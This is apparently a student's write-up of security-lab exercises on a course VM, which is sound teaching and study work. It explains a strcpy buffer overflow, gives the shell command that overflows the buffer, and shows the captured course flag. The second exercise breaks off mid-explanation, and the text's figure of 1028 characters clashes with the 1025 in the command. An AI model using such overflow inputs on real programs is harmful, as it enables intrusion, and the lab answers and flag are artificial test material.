```html
<div style="page-break-after: always;"></div>
```

###### Exercise 1

> [!exercise]+ Exercise 1
> Go to /home/q1/. Exploit the program to get the secret.
> 
> **Answer:**
To exploit the program and obtain the secret, we target the buffer overflow vulnerability caused by `strcpy`. The `buffer` array has 1024 bytes, and `changeme` is immediately after it in memory. To overwrite `changeme`, our input needs to exceed the `buffer` size and alter `changeme`'s value from 0.
> 
> By supplying an input of 1028 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
>```shell
>student@hacklabvm:/home/q1$ ./run_me $(python -c 'print("A"*1025)')
 >_________________________________________
>/ csf2024s1_{flockwise-overdiversificatio \
>\ n-muriciform}                           /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```

<div style="page-break-after: always;"></div>

###### Exercise 2


> [!exercise]+ Exercise 2
> Go to/ home/q2/. Exploit the program to get the secret.
> 
> **Answer:**
> This follows the same logic as exercise 1, but instead of overwriting `changeme` with anything, we need to change it to `0xabcdabcd`. Similar to before, we fill `buffer`

